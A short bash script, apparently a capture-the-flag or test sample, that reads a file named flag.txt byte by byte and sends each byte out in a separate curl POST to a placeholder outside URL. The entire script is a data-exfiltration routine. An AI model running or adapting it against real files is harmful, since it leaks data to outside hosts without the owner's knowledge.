#!/bin/bash

URL="http://google.com"

FILE="./flag.txt"

while IFS= read -n1 byte; do
    curl -X POST -d "$byte" "$URL"
done < "$FILE"
